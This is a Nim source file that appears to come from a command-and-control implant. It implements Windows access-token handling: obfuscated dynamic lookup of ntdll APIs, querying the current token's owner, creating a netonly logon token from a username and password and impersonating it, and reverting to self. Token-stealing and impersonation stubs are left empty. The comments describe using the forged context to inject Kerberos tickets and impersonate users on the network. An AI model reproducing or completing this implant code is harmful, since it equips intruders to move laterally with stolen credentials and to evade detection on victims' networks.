import winim/lean 
import ../../common/[types, utils]

#[
    Token impersonation & manipulation 
    - https://maldevacademy.com/new/modules/57
    - https://www.nccgroup.com/research-blog/demystifying-cobalt-strike-s-make_token-command/ 
    - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c
    - https://github.com/itaymigdal/Nimbo-C2/blob/main/Nimbo-C2/agent/windows/utils/token.nim
]#

# APIs
type 
    NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
    NtOpenThreadToken = proc(threadHandle: HANDLE, desiredAccess: ACCESS_MASK, openAsSelf: BOOLEAN, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}

const 
    CURRENT_THREAD = cast[HANDLE](-2)
    CURRENT_PROCESS = cast[HANDLE](-1)

proc getCurrentToken*(): HANDLE = 
    var 
        status: NTSTATUS = 0
        hToken: HANDLE 

    let hNtdll = GetModuleHandleA(protect("ntdll"))
    let 
        pNtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, protect("NtOpenThreadToken")))
        pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
    
    status = pNtOpenThreadToken(CURRENT_THREAD, TOKEN_QUERY, FALSE, addr hToken)
    if status != STATUS_SUCCESS:
        status = pNtOpenProcessToken(CURRENT_PROCESS, TOKEN_QUERY, addr hToken)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())

    return hToken

proc getTokenOwner*(hToken: HANDLE): string =
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pUser: ptr TOKEN_USER = nil
        usernameLength: DWORD = 0
        domainLength: DWORD = 0
        totalLength: ULONG = 0
        sidName: SID_NAME_USE
        szUsername: PWCHAR = nil
        pDomain: PWCHAR = nil
   
    let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))
   
    # Calculate return length to allocate space
    status = pNtQueryInformationToken(hToken, tokenUser, NULL, 0, addr returnLength)
    if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
        raise newException(CatchableError, protect("NtQueryInformationToken [1] ") & $status.toHex())
    
    pUser = cast[ptr TOKEN_USER](LocalAlloc(LMEM_FIXED, returnLength))
    if pUser == NULL:
        raise newException(CatchableError, "Failed to allocate memory for TOKEN_USER")
    defer: LocalFree(cast[HLOCAL](pUser))
    
    # Retrieve token user information 
    status = pNtQueryInformationToken(hToken, tokenUser, cast[PVOID](pUser), returnLength, addr returnLength)
    if status != STATUS_SUCCESS:
        raise newException(CatchableError, protect("NtQueryInformationToken [2] ") & $status.toHex())
    
    if LookupAccountSidW(NULL, pUser.User.Sid, NULL, addr usernameLength, NULL, addr domainLength, addr sidName) == FALSE:
        sidName = 0        
        
        let
            sizeofWChar = cast[ULONG](sizeof(WCHAR))
            pDomain = cast[PWCHAR](LocalAlloc(LMEM_FIXED, domainLength * sizeofWChar))
            pUsername = cast[PWCHAR](LocalAlloc(LMEM_FIXED, usernameLength * sizeofWChar))
        if pDomain == NULL or pUsername == NULL:
            raise newException(CatchableError, $GetLastError())
        defer: 
            LocalFree(cast[HLOCAL](pDomain))
            LocalFree(cast[HLOCAL](pUsername))
                
        # Retrieve username & domain
        if LookupAccountSidW(nil, pUser.User.Sid, pUsername, addr usernameLength, pDomain, addr domainLength, addr sidName) == FALSE:
            raise newException(CatchableError, $GetLastError())
        
        return $pDomain & "\\" & $pUsername

proc impersonateToken*(hToken: HANDLE) = 
    discard

#[
    Create a new access token from a username, password and domain name triplet.
    Using LOGON32_LOGON_NEW_CREDENTIALS creates a netonly security context (same as using runas.exe /netonly)
    This means that nothing changes locally, the user returned by "getTokenOwner" is the same as the current user. 
    In the network, we are represented by the credentials of the user we created the token for, allowing us to inject Kerberos tickets, etc. to impersonate that user.
    The LOGON32_LOGON_NEW_CREDENTIALS logon type does not validate credentials.

    Using other logon types (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types) 
    changes the output of the getTokenOwner function. The credentials are then validated by the LogonUserA function. 
]#
proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS): bool = 
    if username == "" or password == "" or domain == "": 
        return false

    var 
        hToken: HANDLE 
        hImpersonationToken: HANDLE

    let provider: DWORD = if logonType == LOGON32_LOGON_NEW_CREDENTIALS: LOGON32_PROVIDER_WINNT50 else: LOGON32_PROVIDER_DEFAULT
    if LogonUserA(username, domain, password, logonType, provider, addr hToken): 
        
        if DuplicateTokenEx(hToken, TOKEN_QUERY or TOKEN_IMPERSONATE, NULL, securityImpersonation, tokenImpersonation, addr hImpersonationToken) == FALSE:
            return false
        defer: CloseHandle(hImpersonationToken)
    
        if ImpersonateLoggedOnUser(hImpersonationToken) == FALSE: 
            return false
    
    else: 
        return false 

    defer: CloseHandle(hToken)

    return true

proc tokenSteal*(pid: int): bool = 
    discard 

proc rev2self*(): bool = 
    return RevertToSelf()
